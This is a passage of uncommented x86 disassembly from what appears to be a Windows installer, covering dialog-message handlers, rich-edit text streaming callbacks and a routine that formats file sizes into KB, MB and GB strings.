  403a27:	c2 04 00             	ret    $0x4
  403a2a:	ff 74 24 0c          	push   0xc(%esp)
  403a2e:	6a 00                	push   $0x0
  403a30:	e8 f8 27 00 00       	call   0x40622d
  403a35:	50                   	push   %eax
  403a36:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403a3a:	05 e8 03 00 00       	add    $0x3e8,%eax
  403a3f:	50                   	push   %eax
  403a40:	ff 74 24 0c          	push   0xc(%esp)
  403a44:	e8 45 1e 00 00       	call   0x40588e
  403a49:	c2 0c 00             	ret    $0xc
  403a4c:	83 3d 6c b3 47 00 00 	cmpl   $0x0,0x47b36c
  403a53:	a1 7c 3d 44 00       	mov    0x443d7c,%eax
  403a58:	75 05                	jne    0x403a5f
  403a5a:	a1 8c 3d 44 00       	mov    0x443d8c,%eax
  403a5f:	6a 01                	push   $0x1
  403a61:	6a 01                	push   $0x1
  403a63:	68 f4 00 00 00       	push   $0xf4
  403a68:	50                   	push   %eax
  403a69:	ff 15 78 82 40 00    	call   *0x408278
  403a6f:	c3                   	ret
  403a70:	ff 74 24 04          	push   0x4(%esp)
  403a74:	ff 35 8c 3d 44 00    	push   0x443d8c
  403a7a:	ff 15 70 82 40 00    	call   *0x408270
  403a80:	c2 04 00             	ret    $0x4
  403a83:	6a 01                	push   $0x1
  403a85:	ff 74 24 08          	push   0x8(%esp)
  403a89:	6a 28                	push   $0x28
  403a8b:	ff 35 b4 b2 47 00    	push   0x47b2b4
  403a91:	ff 15 78 82 40 00    	call   *0x408278
  403a97:	c2 04 00             	ret    $0x4
  403a9a:	a1 68 32 47 00       	mov    0x473268,%eax
  403a9f:	85 c0                	test   %eax,%eax
  403aa1:	74 0f                	je     0x403ab2
  403aa3:	6a 00                	push   $0x0
  403aa5:	6a 00                	push   $0x0
  403aa7:	ff 74 24 0c          	push   0xc(%esp)
  403aab:	50                   	push   %eax
  403aac:	ff 15 78 82 40 00    	call   *0x408278
  403ab2:	c2 04 00             	ret    $0x4
  403ab5:	55                   	push   %ebp
  403ab6:	8b ec                	mov    %esp,%ebp
  403ab8:	83 ec 0c             	sub    $0xc,%esp
  403abb:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403ac0:	56                   	push   %esi
  403ac1:	83 f8 05             	cmp    $0x5,%eax
  403ac4:	0f 87 8e 00 00 00    	ja     0x403b58
  403aca:	6a eb                	push   $0xffffffeb
  403acc:	ff 75 0c             	push   0xc(%ebp)
  403acf:	ff 15 48 82 40 00    	call   *0x408248
  403ad5:	8b f0                	mov    %eax,%esi
  403ad7:	85 f6                	test   %esi,%esi
  403ad9:	74 7d                	je     0x403b58
  403adb:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403adf:	8b 06                	mov    (%esi),%eax
  403ae1:	57                   	push   %edi
  403ae2:	8b 3d 4c 82 40 00    	mov    0x40824c,%edi
  403ae8:	74 03                	je     0x403aed
  403aea:	50                   	push   %eax
  403aeb:	ff d7                	call   *%edi
  403aed:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403af1:	74 0a                	je     0x403afd
  403af3:	50                   	push   %eax
  403af4:	ff 75 08             	push   0x8(%ebp)
  403af7:	ff 15 54 80 40 00    	call   *0x408054
  403afd:	ff 76 10             	push   0x10(%esi)
  403b00:	ff 75 08             	push   0x8(%ebp)
  403b03:	ff 15 50 80 40 00    	call   *0x408050
  403b09:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  403b0d:	8b 46 04             	mov    0x4(%esi),%eax
  403b10:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403b13:	74 06                	je     0x403b1b
  403b15:	50                   	push   %eax
  403b16:	ff d7                	call   *%edi
  403b18:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403b1b:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403b1f:	5f                   	pop    %edi
  403b20:	74 0a                	je     0x403b2c
  403b22:	50                   	push   %eax
  403b23:	ff 75 08             	push   0x8(%ebp)
  403b26:	ff 15 3c 80 40 00    	call   *0x40803c
  403b2c:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  403b30:	74 21                	je     0x403b53
  403b32:	8b 46 08             	mov    0x8(%esi),%eax
  403b35:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403b38:	8b 46 0c             	mov    0xc(%esi),%eax
  403b3b:	85 c0                	test   %eax,%eax
  403b3d:	74 07                	je     0x403b46
  403b3f:	50                   	push   %eax
  403b40:	ff 15 44 80 40 00    	call   *0x408044
  403b46:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b49:	50                   	push   %eax
  403b4a:	ff 15 48 80 40 00    	call   *0x408048
  403b50:	89 46 0c             	mov    %eax,0xc(%esi)
  403b53:	8b 46 0c             	mov    0xc(%esi),%eax
  403b56:	eb 02                	jmp    0x403b5a
  403b58:	33 c0                	xor    %eax,%eax
  403b5a:	5e                   	pop    %esi
  403b5b:	c9                   	leave
  403b5c:	c2 08 00             	ret    $0x8
  403b5f:	53                   	push   %ebx
  403b60:	55                   	push   %ebp
  403b61:	56                   	push   %esi
  403b62:	57                   	push   %edi
  403b63:	bf c0 c0 4d 00       	mov    $0x4dc0c0,%edi
  403b68:	57                   	push   %edi
  403b69:	be ff ff 00 00       	mov    $0xffff,%esi
  403b6e:	e8 08 20 00 00       	call   0x405b7b
  403b73:	0f b7 d8             	movzwl %ax,%ebx
  403b76:	8b 0d e4 b2 47 00    	mov    0x47b2e4,%ecx
  403b7c:	85 c9                	test   %ecx,%ecx
  403b7e:	74 42                	je     0x403bc2
  403b80:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  403b85:	8b 40 64             	mov    0x64(%eax),%eax
  403b88:	8b d0                	mov    %eax,%edx
  403b8a:	0f af c1             	imul   %ecx,%eax
  403b8d:	f7 da                	neg    %edx
  403b8f:	03 05 e0 b2 47 00    	add    0x47b2e0,%eax
  403b95:	03 c2                	add    %edx,%eax
  403b97:	66 8b 28             	mov    (%eax),%bp
  403b9a:	66 33 eb             	xor    %bx,%bp
  403b9d:	49                   	dec    %ecx
  403b9e:	66 85 ee             	test   %bp,%si
  403ba1:	74 06                	je     0x403ba9
  403ba3:	85 c9                	test   %ecx,%ecx
  403ba5:	75 ee                	jne    0x403b95
  403ba7:	eb 19                	jmp    0x403bc2
  403ba9:	8b 48 02             	mov    0x2(%eax),%ecx
  403bac:	89 0d 7c 32 47 00    	mov    %ecx,0x47327c
  403bb2:	8b 48 06             	mov    0x6(%eax),%ecx
  403bb5:	89 0d 88 b3 47 00    	mov    %ecx,0x47b388
  403bbb:	8d 48 0a             	lea    0xa(%eax),%ecx
  403bbe:	85 c9                	test   %ecx,%ecx
  403bc0:	75 15                	jne    0x403bd7
  403bc2:	b8 ff ff 00 00       	mov    $0xffff,%eax
  403bc7:	66 3b f0             	cmp    %ax,%si
  403bca:	75 07                	jne    0x403bd3
  403bcc:	be ff 03 00 00       	mov    $0x3ff,%esi
  403bd1:	eb a3                	jmp    0x403b76
  403bd3:	33 f6                	xor    %esi,%esi
  403bd5:	eb 9f                	jmp    0x403b76
  403bd7:	89 0d 88 32 47 00    	mov    %ecx,0x473288
  403bdd:	0f b7 00             	movzwl (%eax),%eax
  403be0:	50                   	push   %eax
  403be1:	57                   	push   %edi
  403be2:	e8 7b 1f 00 00       	call   0x405b62
  403be7:	6a fe                	push   $0xfffffffe
  403be9:	68 a0 32 47 00       	push   $0x4732a0
  403bee:	e8 3a 26 00 00       	call   0x40622d
  403bf3:	50                   	push   %eax
  403bf4:	ff 35 88 3d 44 00    	push   0x443d88
  403bfa:	ff 15 28 82 40 00    	call   *0x408228
  403c00:	8b 35 c8 b2 47 00    	mov    0x47b2c8,%esi
  403c06:	8b 3d cc b2 47 00    	mov    0x47b2cc,%edi
  403c0c:	eb 17                	jmp    0x403c25
  403c0e:	8b 06                	mov    (%esi),%eax
  403c10:	4f                   	dec    %edi
  403c11:	85 c0                	test   %eax,%eax
  403c13:	74 0a                	je     0x403c1f
  403c15:	50                   	push   %eax
  403c16:	8d 46 18             	lea    0x18(%esi),%eax
  403c19:	50                   	push   %eax
  403c1a:	e8 0e 26 00 00       	call   0x40622d
  403c1f:	81 c6 20 40 00 00    	add    $0x4020,%esi
  403c25:	85 ff                	test   %edi,%edi
  403c27:	75 e5                	jne    0x403c0e
  403c29:	5f                   	pop    %edi
  403c2a:	5e                   	pop    %esi
  403c2b:	5d                   	pop    %ebp
  403c2c:	5b                   	pop    %ebx
  403c2d:	c3                   	ret
  403c2e:	55                   	push   %ebp
  403c2f:	8b ec                	mov    %esp,%ebp
  403c31:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  403c35:	56                   	push   %esi
  403c36:	8b 35 78 82 40 00    	mov    0x408278,%esi
  403c3c:	75 1c                	jne    0x403c5a
  403c3e:	ff 75 14             	push   0x14(%ebp)
  403c41:	68 fb 03 00 00       	push   $0x3fb
  403c46:	e8 49 1c 00 00       	call   0x405894
  403c4b:	ff 75 14             	push   0x14(%ebp)
  403c4e:	6a 01                	push   $0x1
  403c50:	68 67 04 00 00       	push   $0x467
  403c55:	ff 75 08             	push   0x8(%ebp)
  403c58:	ff d6                	call   *%esi
  403c5a:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  403c5e:	75 2d                	jne    0x403c8d
  403c60:	ff 75 14             	push   0x14(%ebp)
  403c63:	ff 75 10             	push   0x10(%ebp)
  403c66:	ff 15 7c 81 40 00    	call   *0x40817c
  403c6c:	85 c0                	test   %eax,%eax
  403c6e:	74 0e                	je     0x403c7e
  403c70:	6a 07                	push   $0x7
  403c72:	e8 a6 d7 ff ff       	call   0x40141d
  403c77:	85 c0                	test   %eax,%eax
  403c79:	75 03                	jne    0x403c7e
  403c7b:	40                   	inc    %eax
  403c7c:	eb 02                	jmp    0x403c80
  403c7e:	33 c0                	xor    %eax,%eax
  403c80:	50                   	push   %eax
  403c81:	6a 00                	push   $0x0
  403c83:	68 65 04 00 00       	push   $0x465
  403c88:	ff 75 08             	push   0x8(%ebp)
  403c8b:	ff d6                	call   *%esi
  403c8d:	33 c0                	xor    %eax,%eax
  403c8f:	5e                   	pop    %esi
  403c90:	5d                   	pop    %ebp
  403c91:	c2 10 00             	ret    $0x10
  403c94:	53                   	push   %ebx
  403c95:	8b 1d 44 81 40 00    	mov    0x408144,%ebx
  403c9b:	55                   	push   %ebp
  403c9c:	56                   	push   %esi
  403c9d:	33 f6                	xor    %esi,%esi
  403c9f:	56                   	push   %esi
  403ca0:	56                   	push   %esi
  403ca1:	56                   	push   %esi
  403ca2:	56                   	push   %esi
  403ca3:	6a ff                	push   $0xffffffff
  403ca5:	ff 74 24 24          	push   0x24(%esp)
  403ca9:	56                   	push   %esi
  403caa:	56                   	push   %esi
  403cab:	ff d3                	call   *%ebx
  403cad:	33 ed                	xor    %ebp,%ebp
  403caf:	3b c6                	cmp    %esi,%eax
  403cb1:	74 1e                	je     0x403cd1
  403cb3:	57                   	push   %edi
  403cb4:	8d 78 01             	lea    0x1(%eax),%edi
  403cb7:	57                   	push   %edi
  403cb8:	6a 40                	push   $0x40
  403cba:	ff 15 20 81 40 00    	call   *0x408120
  403cc0:	56                   	push   %esi
  403cc1:	56                   	push   %esi
  403cc2:	57                   	push   %edi
  403cc3:	8b e8                	mov    %eax,%ebp
  403cc5:	55                   	push   %ebp
  403cc6:	6a ff                	push   $0xffffffff
  403cc8:	ff 74 24 28          	push   0x28(%esp)
  403ccc:	56                   	push   %esi
  403ccd:	56                   	push   %esi
  403cce:	ff d3                	call   *%ebx
  403cd0:	5f                   	pop    %edi
  403cd1:	5e                   	pop    %esi
  403cd2:	8b c5                	mov    %ebp,%eax
  403cd4:	5d                   	pop    %ebp
  403cd5:	5b                   	pop    %ebx
  403cd6:	c3                   	ret
  403cd7:	55                   	push   %ebp
  403cd8:	8b ec                	mov    %esp,%ebp
  403cda:	83 3d cc fd 45 00 00 	cmpl   $0x0,0x45fdcc
  403ce1:	56                   	push   %esi
  403ce2:	75 50                	jne    0x403d34
  403ce4:	ff 75 10             	push   0x10(%ebp)
  403ce7:	a1 60 fd 43 00       	mov    0x43fd60,%eax
  403cec:	8b 75 08             	mov    0x8(%ebp),%esi
  403cef:	03 c6                	add    %esi,%eax
  403cf1:	50                   	push   %eax
  403cf2:	ff 75 0c             	push   0xc(%ebp)
  403cf5:	ff 15 70 81 40 00    	call   *0x408170
  403cfb:	ff 75 0c             	push   0xc(%ebp)
  403cfe:	ff 15 4c 81 40 00    	call   *0x40814c
  403d04:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403d07:	01 05 60 fd 43 00    	add    %eax,0x43fd60
  403d0d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403d11:	89 01                	mov    %eax,(%ecx)
  403d13:	7e 25                	jle    0x403d3a
  403d15:	85 c0                	test   %eax,%eax
  403d17:	75 21                	jne    0x403d3a
  403d19:	39 05 78 3d 44 00    	cmp    %eax,0x443d78
  403d1f:	74 19                	je     0x403d3a
  403d21:	56                   	push   %esi
  403d22:	ff 15 2c 81 40 00    	call   *0x40812c
  403d28:	c7 05 cc fd 45 00 01 	movl   $0x1,0x45fdcc
  403d2f:	00 00 00 
  403d32:	eb 06                	jmp    0x403d3a
  403d34:	8b 45 14             	mov    0x14(%ebp),%eax
  403d37:	83 20 00             	andl   $0x0,(%eax)
  403d3a:	33 c0                	xor    %eax,%eax
  403d3c:	5e                   	pop    %esi
  403d3d:	5d                   	pop    %ebp
  403d3e:	c2 10 00             	ret    $0x10
  403d41:	55                   	push   %ebp
  403d42:	8b ec                	mov    %esp,%ebp
  403d44:	8b 45 10             	mov    0x10(%ebp),%eax
  403d47:	d1 e8                	shr    $1,%eax
  403d49:	75 03                	jne    0x403d4e
  403d4b:	33 c0                	xor    %eax,%eax
  403d4d:	40                   	inc    %eax
  403d4e:	8b 0d 60 fd 43 00    	mov    0x43fd60,%ecx
  403d54:	50                   	push   %eax
  403d55:	8b 45 08             	mov    0x8(%ebp),%eax
  403d58:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403d5b:	50                   	push   %eax
  403d5c:	ff 75 0c             	push   0xc(%ebp)
  403d5f:	ff 15 c4 80 40 00    	call   *0x4080c4
  403d65:	ff 75 0c             	push   0xc(%ebp)
  403d68:	ff 15 c0 80 40 00    	call   *0x4080c0
  403d6e:	8b 55 14             	mov    0x14(%ebp),%edx
  403d71:	01 05 60 fd 43 00    	add    %eax,0x43fd60
  403d77:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  403d7a:	89 0a                	mov    %ecx,(%edx)
  403d7c:	33 c0                	xor    %eax,%eax
  403d7e:	5d                   	pop    %ebp
  403d7f:	c2 10 00             	ret    $0x10
  403d82:	55                   	push   %ebp
  403d83:	8b ec                	mov    %esp,%ebp
  403d85:	83 ec 18             	sub    $0x18,%esp
  403d88:	53                   	push   %ebx
  403d89:	33 db                	xor    %ebx,%ebx
  403d8b:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403d92:	56                   	push   %esi
  403d93:	57                   	push   %edi
  403d94:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403d97:	0f 85 2d 01 00 00    	jne    0x403eca
  403d9d:	8b 7d 14             	mov    0x14(%ebp),%edi
  403da0:	8b 47 30             	mov    0x30(%edi),%eax
  403da3:	3b c3                	cmp    %ebx,%eax
  403da5:	7d 11                	jge    0x403db8
  403da7:	8b 0d 88 32 47 00    	mov    0x473288,%ecx
  403dad:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  403db4:	2b c8                	sub    %eax,%ecx
  403db6:	8b 01                	mov    (%ecx),%eax
  403db8:	8b 0d d8 b2 47 00    	mov    0x47b2d8,%ecx
  403dbe:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  403dc1:	0f b7 08             	movzwl (%eax),%ecx
  403dc4:	40                   	inc    %eax
  403dc5:	40                   	inc    %eax
  403dc6:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  403dc9:	89 1d cc fd 45 00    	mov    %ebx,0x45fdcc
  403dcf:	89 45 14             	mov    %eax,0x14(%ebp)
  403dd2:	f6 c1 10             	test   $0x10,%cl
  403dd5:	74 09                	je     0x403de0
  403dd7:	c7 45 fc 41 3d 40 00 	movl   $0x403d41,-0x4(%ebp)
  403dde:	eb 18                	jmp    0x403df8
  403de0:	50                   	push   %eax
  403de1:	c7 45 fc d7 3c 40 00 	movl   $0x403cd7,-0x4(%ebp)
  403de8:	e8 a7 fe ff ff       	call   0x403c94
  403ded:	59                   	pop    %ecx
  403dee:	c7 05 78 3d 44 00 01 	movl   $0x1,0x443d78
  403df5:	00 00 00 
  403df8:	ff 77 34             	push   0x34(%edi)
  403dfb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403dfe:	8b 47 14             	mov    0x14(%edi),%eax
  403e01:	8b f0                	mov    %eax,%esi
  403e03:	c1 ee 05             	shr    $0x5,%esi
  403e06:	f7 d6                	not    %esi
  403e08:	6a 22                	push   $0x22
  403e0a:	ff 75 08             	push   0x8(%ebp)
  403e0d:	0b f0                	or     %eax,%esi
  403e0f:	83 e6 01             	and    $0x1,%esi
  403e12:	e8 13 fc ff ff       	call   0x403a2a
  403e17:	ff 77 38             	push   0x38(%edi)
  403e1a:	6a 23                	push   $0x23
  403e1c:	ff 75 08             	push   0x8(%ebp)
  403e1f:	e8 06 fc ff ff       	call   0x403a2a
  403e24:	33 c0                	xor    %eax,%eax
  403e26:	3b f3                	cmp    %ebx,%esi
  403e28:	0f 94 c0             	sete   %al
  403e2b:	6a 01                	push   $0x1
  403e2d:	05 0a 04 00 00       	add    $0x40a,%eax
  403e32:	50                   	push   %eax
  403e33:	ff 75 08             	push   0x8(%ebp)
  403e36:	ff 15 e8 81 40 00    	call   *0x4081e8
  403e3c:	56                   	push   %esi
  403e3d:	e8 2e fc ff ff       	call   0x403a70
  403e42:	68 e8 03 00 00       	push   $0x3e8
  403e47:	ff 75 08             	push   0x8(%ebp)
  403e4a:	ff 15 60 82 40 00    	call   *0x408260
  403e50:	8b f8                	mov    %eax,%edi
  403e52:	57                   	push   %edi
  403e53:	e8 2b fc ff ff       	call   0x403a83
  403e58:	8b 35 78 82 40 00    	mov    0x408278,%esi
  403e5e:	53                   	push   %ebx
  403e5f:	6a 01                	push   $0x1
  403e61:	68 5b 04 00 00       	push   $0x45b
  403e66:	57                   	push   %edi
  403e67:	ff d6                	call   *%esi
  403e69:	a1 bc b2 47 00       	mov    0x47b2bc,%eax
  403e6e:	8b 40 68             	mov    0x68(%eax),%eax
  403e71:	3b c3                	cmp    %ebx,%eax
  403e73:	7d 09                	jge    0x403e7e
  403e75:	f7 d8                	neg    %eax
  403e77:	50                   	push   %eax
  403e78:	ff 15 4c 82 40 00    	call   *0x40824c
  403e7e:	50                   	push   %eax
  403e7f:	53                   	push   %ebx
  403e80:	68 43 04 00 00       	push   $0x443
  403e85:	57                   	push   %edi
  403e86:	ff d6                	call   *%esi
  403e88:	68 00 00 01 04       	push   $0x4010000
  403e8d:	53                   	push   %ebx
  403e8e:	68 45 04 00 00       	push   $0x445
  403e93:	57                   	push   %edi
  403e94:	ff d6                	call   *%esi
  403e96:	ff 75 14             	push   0x14(%ebp)
  403e99:	89 1d 60 fd 43 00    	mov    %ebx,0x43fd60
  403e9f:	e8 8d 1d 00 00       	call   0x405c31
  403ea4:	50                   	push   %eax
  403ea5:	53                   	push   %ebx
  403ea6:	68 35 04 00 00       	push   $0x435
  403eab:	57                   	push   %edi
  403eac:	ff d6                	call   *%esi
  403eae:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403eb1:	50                   	push   %eax
  403eb2:	ff 75 0c             	push   0xc(%ebp)
  403eb5:	68 49 04 00 00       	push   $0x449
  403eba:	57                   	push   %edi
  403ebb:	ff d6                	call   *%esi
  403ebd:	89 1d d4 fd 45 00    	mov    %ebx,0x45fdd4
  403ec3:	33 c0                	xor    %eax,%eax
  403ec5:	e9 5b 01 00 00       	jmp    0x404025
  403eca:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  403ed1:	8b 35 78 82 40 00    	mov    0x408278,%esi
  403ed7:	75 5c                	jne    0x403f35
  403ed9:	8b 45 10             	mov    0x10(%ebp),%eax
  403edc:	c1 e8 10             	shr    $0x10,%eax
  403edf:	66 85 c0             	test   %ax,%ax
  403ee2:	0f 85 2e 01 00 00    	jne    0x404016
  403ee8:	39 1d d4 fd 45 00    	cmp    %ebx,0x45fdd4
  403eee:	0f 85 22 01 00 00    	jne    0x404016
  403ef4:	8b 3d c8 fd 45 00    	mov    0x45fdc8,%edi
  403efa:	83 c7 14             	add    $0x14,%edi
  403efd:	f6 07 20             	testb  $0x20,(%edi)
  403f00:	0f 84 10 01 00 00    	je     0x404016
  403f06:	53                   	push   %ebx
  403f07:	53                   	push   %ebx
  403f08:	68 f0 00 00 00       	push   $0xf0
  403f0d:	68 0a 04 00 00       	push   $0x40a
  403f12:	ff 75 08             	push   0x8(%ebp)
  403f15:	ff 15 60 82 40 00    	call   *0x408260
  403f1b:	50                   	push   %eax
  403f1c:	ff d6                	call   *%esi
  403f1e:	8b 0f                	mov    (%edi),%ecx
  403f20:	83 e0 01             	and    $0x1,%eax
  403f23:	83 e1 fe             	and    $0xfffffffe,%ecx
  403f26:	0b c8                	or     %eax,%ecx
  403f28:	50                   	push   %eax
  403f29:	89 0f                	mov    %ecx,(%edi)
  403f2b:	e8 40 fb ff ff       	call   0x403a70
  403f30:	e8 17 fb ff ff       	call   0x403a4c
  403f35:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  403f39:	0f 85 c8 00 00 00    	jne    0x404007
  403f3f:	68 e8 03 00 00       	push   $0x3e8
  403f44:	ff 75 08             	push   0x8(%ebp)
  403f47:	ff 15 60 82 40 00    	call   *0x408260
  403f4d:	8b 7d 14             	mov    0x14(%ebp),%edi
  403f50:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  403f57:	75 6f                	jne    0x403fc8
  403f59:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  403f60:	75 66                	jne    0x403fc8
  403f62:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  403f65:	8b 57 18             	mov    0x18(%edi),%edx
  403f68:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  403f6b:	2b ca                	sub    %edx,%ecx
  403f6d:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403f70:	c7 45 f0 20 b2 46 00 	movl   $0x46b220,-0x10(%ebp)
  403f77:	81 f9 10 80 00 00    	cmp    $0x8010,%ecx
  403f7d:	73 49                	jae    0x403fc8
  403f7f:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403f82:	51                   	push   %ecx
  403f83:	53                   	push   %ebx
  403f84:	68 4b 04 00 00       	push   $0x44b
  403f89:	50                   	push   %eax
  403f8a:	ff d6                	call   *%esi
  403f8c:	8b 3d 40 82 40 00    	mov    0x408240,%edi
  403f92:	68 02 7f 00 00       	push   $0x7f02
  403f97:	53                   	push   %ebx
  403f98:	ff d7                	call   *%edi
  403f9a:	50                   	push   %eax
  403f9b:	ff 15 44 82 40 00    	call   *0x408244
  403fa1:	6a 01                	push   $0x1
  403fa3:	53                   	push   %ebx
  403fa4:	53                   	push   %ebx
  403fa5:	ff 75 f0             	push   -0x10(%ebp)
  403fa8:	68 20 86 40 00       	push   $0x408620
  403fad:	ff 75 08             	push   0x8(%ebp)
  403fb0:	ff 15 84 81 40 00    	call   *0x408184
  403fb6:	68 00 7f 00 00       	push   $0x7f00
  403fbb:	53                   	push   %ebx
  403fbc:	ff d7                	call   *%edi
  403fbe:	50                   	push   %eax
  403fbf:	ff 15 44 82 40 00    	call   *0x408244
  403fc5:	8b 7d 14             	mov    0x14(%ebp),%edi
  403fc8:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  403fcf:	75 48                	jne    0x404019
  403fd1:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  403fd8:	75 3f                	jne    0x404019
  403fda:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  403fde:	75 10                	jne    0x403ff0
  403fe0:	53                   	push   %ebx
  403fe1:	6a 01                	push   $0x1
  403fe3:	68 11 01 00 00       	push   $0x111
  403fe8:	ff 35 b4 b2 47 00    	push   0x47b2b4
  403fee:	ff d6                	call   *%esi
  403ff0:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  403ff4:	75 0c                	jne    0x404002
  403ff6:	53                   	push   %ebx
  403ff7:	53                   	push   %ebx
  403ff8:	6a 10                	push   $0x10
  403ffa:	ff 35 b4 b2 47 00    	push   0x47b2b4
  404000:	ff d6                	call   *%esi
  404002:	33 c0                	xor    %eax,%eax
  404004:	40                   	inc    %eax
  404005:	eb 1e                	jmp    0x404025
  404007:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40400e:	75 06                	jne    0x404016
  404010:	ff 05 d4 fd 45 00    	incl   0x45fdd4
  404016:	8b 7d 14             	mov    0x14(%ebp),%edi
  404019:	8b 45 0c             	mov    0xc(%ebp),%eax
  40401c:	57                   	push   %edi
  40401d:	ff 75 10             	push   0x10(%ebp)
  404020:	e8 90 fa ff ff       	call   0x403ab5
  404025:	5f                   	pop    %edi
  404026:	5e                   	pop    %esi
  404027:	5b                   	pop    %ebx
  404028:	c9                   	leave
  404029:	c2 10 00             	ret    $0x10
  40402c:	55                   	push   %ebp
  40402d:	8b ec                	mov    %esp,%ebp
  40402f:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404036:	56                   	push   %esi
  404037:	8b 75 14             	mov    0x14(%ebp),%esi
  40403a:	75 29                	jne    0x404065
  40403c:	ff 76 30             	push   0x30(%esi)
  40403f:	6a 1d                	push   $0x1d
  404041:	ff 75 08             	push   0x8(%ebp)
  404044:	e8 e1 f9 ff ff       	call   0x403a2a
  404049:	8b 46 3c             	mov    0x3c(%esi),%eax
  40404c:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  404052:	05 00 c0 47 00       	add    $0x47c000,%eax
  404057:	50                   	push   %eax
  404058:	68 e8 03 00 00       	push   $0x3e8
  40405d:	ff 75 08             	push   0x8(%ebp)
  404060:	e8 29 18 00 00       	call   0x40588e
  404065:	8b 45 0c             	mov    0xc(%ebp),%eax
  404068:	56                   	push   %esi
  404069:	ff 75 10             	push   0x10(%ebp)
  40406c:	e8 44 fa ff ff       	call   0x403ab5
  404071:	5e                   	pop    %esi
  404072:	5d                   	pop    %ebp
  404073:	c2 10 00             	ret    $0x10
  404076:	55                   	push   %ebp
  404077:	8b ec                	mov    %esp,%ebp
  404079:	81 ec 84 00 00 00    	sub    $0x84,%esp
  40407f:	53                   	push   %ebx
  404080:	56                   	push   %esi
  404081:	57                   	push   %edi
  404082:	8b f8                	mov    %eax,%edi
  404084:	6a 14                	push   $0x14
  404086:	5b                   	pop    %ebx
  404087:	c7 45 fc dc ff ff ff 	movl   $0xffffffdc,-0x4(%ebp)
  40408e:	81 ff 00 00 10 00    	cmp    $0x100000,%edi
  404094:	73 0a                	jae    0x4040a0
  404096:	6a 0a                	push   $0xa
  404098:	5b                   	pop    %ebx
  404099:	c7 45 fc dd ff ff ff 	movl   $0xffffffdd,-0x4(%ebp)
  4040a0:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  4040a6:	73 09                	jae    0x4040b1
  4040a8:	33 db                	xor    %ebx,%ebx
  4040aa:	c7 45 fc de ff ff ff 	movl   $0xffffffde,-0x4(%ebp)
  4040b1:	81 ff 33 33 ff ff    	cmp    $0xffff3333,%edi
  4040b7:	73 0f                	jae    0x4040c8
  4040b9:	33 c0                	xor    %eax,%eax
  4040bb:	40                   	inc    %eax
  4040bc:	8b cb                	mov    %ebx,%ecx
  4040be:	d3 e0                	shl    %cl,%eax
  4040c0:	6a 14                	push   $0x14
  4040c2:	59                   	pop    %ecx
  4040c3:	99                   	cltd
  4040c4:	f7 f9                	idiv   %ecx
  4040c6:	03 f8                	add    %eax,%edi
  4040c8:	ff 75 0c             	push   0xc(%ebp)
  4040cb:	be a8 fd 44 00       	mov    $0x44fda8,%esi
  4040d0:	56                   	push   %esi
  4040d1:	e8 57 21 00 00       	call   0x40622d
  4040d6:	6a df                	push   $0xffffffdf
  4040d8:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4040db:	50                   	push   %eax
  4040dc:	e8 4c 21 00 00       	call   0x40622d
  4040e1:	50                   	push   %eax
  4040e2:	ff 75 fc             	push   -0x4(%ebp)
  4040e5:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4040eb:	50                   	push   %eax
  4040ec:	e8 3c 21 00 00       	call   0x40622d
  4040f1:	50                   	push   %eax
  4040f2:	8b c7                	mov    %edi,%eax
  4040f4:	25 ff ff ff 00       	and    $0xffffff,%eax
  4040f9:	6b c0 0a             	imul   $0xa,%eax,%eax
  4040fc:	6a 0a                	push   $0xa
  4040fe:	8b cb                	mov    %ebx,%ecx
  404100:	d3 e8                	shr    %cl,%eax
  404102:	59                   	pop    %ecx
  404103:	33 d2                	xor    %edx,%edx
  404105:	f7 f1                	div    %ecx
  404107:	8b cb                	mov    %ebx,%ecx
  404109:	d3 ef                	shr    %cl,%edi
  40410b:	52                   	push   %edx
  40410c:	57                   	push   %edi
  40410d:	68 2c 86 40 00       	push   $0x40862c
  404112:	56                   	push   %esi
  404113:	e8 19 1b 00 00       	call   0x405c31
  404118:	8d 04 45 a8 fd 44 00 	lea    0x44fda8(,%eax,2),%eax
  40411f:	50                   	push   %eax
  404120:	ff 15 38 82 40 00    	call   *0x408238
  404126:	83 c4 18             	add    $0x18,%esp
